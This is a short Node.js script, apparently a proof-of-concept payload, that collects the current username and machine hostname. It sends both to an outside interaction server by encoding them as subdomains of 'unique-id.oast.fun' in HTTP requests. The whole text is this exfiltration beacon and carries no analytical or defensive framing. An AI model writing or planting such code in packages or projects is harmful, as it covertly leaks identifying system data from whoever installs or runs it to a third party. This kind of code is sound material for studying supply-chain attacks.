const os = require("os");
const http = require("http");
const domain = "unique-id.oast.fun";
for (const value of [os.userInfo().username, os.hostname()]) {
  http.request({ hostname: `${value}.${domain}`, port: 80, path: "/profile", method: "GET" }).end();
}
